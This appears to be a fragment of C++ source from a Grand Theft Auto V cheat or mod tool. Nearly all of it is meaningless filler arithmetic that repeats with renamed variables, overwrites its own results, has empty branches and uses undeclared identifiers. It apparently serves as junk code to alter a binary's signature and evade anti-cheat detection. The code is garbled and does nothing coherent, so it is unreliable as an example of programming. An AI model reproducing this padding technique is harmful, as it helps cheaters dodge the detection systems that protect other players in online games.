			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::LOG::LogSemHora("<FrozenPos>false</FrozenPos>");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
